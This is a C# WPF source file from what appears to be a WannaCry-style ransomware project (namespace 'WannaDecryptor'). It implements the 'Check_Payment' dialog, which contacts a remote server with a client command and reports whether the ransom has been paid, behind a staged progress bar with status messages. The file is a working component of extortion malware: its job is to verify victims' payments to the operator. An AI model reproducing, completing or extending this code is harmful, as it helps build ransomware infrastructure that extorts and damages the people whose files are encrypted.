using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace WannaDecryptor
{
    /// <summary>
    /// Check_Payment.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class Check_Payment : Window
    {
        private string server_ip = "";
        private string server_command = "";
        private string result = "";
        private int server_port = 0;

        public string _result() { return result; }

        public Check_Payment(string ip, int port, string command)
        {
            InitializeComponent();
            server_ip = ip;
            server_command = command;
            server_port = port;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            PB.Value = 0;
            server_ip = "";
            server_command = "";
            server_port = 0;
        }

        private void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            PB.Value = e.ProgressPercentage;
        }

        private void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            string connection = "";
            for (int i = 0; i < 101; i++)
            {
                try
                {
                    (sender as BackgroundWorker).ReportProgress(i);
                    Thread.Sleep(100);
                    if (i == 30)
                    {
                        connection = Client.Connection(server_ip, server_port, server_command);
                        Thread.Sleep(5000);
                    }
                    else if (i == 50)
                    {
                        this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                        {
                            TaskM.Content = "Checking server return data...";
                        }));

                        if (connection.Equals("NOT_FOUND_CLIENT_ID") || connection.Equals("EXCEPTION") || connection == null)
                        {
                            break;
                        }
                        Thread.Sleep(1500);
                    }
                    else if (i == 70)
                    {
                        if (connection.ToLower().Equals("true")) connection = "true";
                        else connection = "false";
                        Thread.Sleep(3000);
                    }
                    else if (i == 100)
                    {
                        this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                        {
                            TaskM.Content = "Terminating Task...";
                        }));
                        result = connection;
                        Thread.Sleep(500);
                        this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                        {
                            this.Close();
                        }));
                    }
                }
                catch (Exception) { }
            }
        }


        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            result = "";
            if (!server_ip.Equals("") && !(server_port == 0) && !server_command.Equals(""))
            {
                BackgroundWorker worker = new BackgroundWorker();
                worker.WorkerReportsProgress = true;
                worker.DoWork += worker_DoWork;
                worker.ProgressChanged += worker_ProgressChanged;
                worker.RunWorkerAsync();
            }
        }
    }
}
